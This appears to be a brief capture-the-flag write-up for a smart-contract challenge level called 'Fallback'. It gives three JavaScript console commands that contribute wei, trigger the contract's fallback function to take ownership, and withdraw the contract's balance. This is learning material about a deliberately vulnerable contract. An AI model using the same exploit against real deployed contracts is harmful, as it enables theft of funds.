# Level 1 - Fallback

Exploit flow:

1. Contribute to the contract via the ```contribute()``` function
2. Send some wei to the contract's address to trigger the ```fallback()``` function
3. Withdraw the money

In the console:

```js
await contract.contribute({value: 1})
await contract.sendTransaction({value: 1})
await contract.withdraw()
```
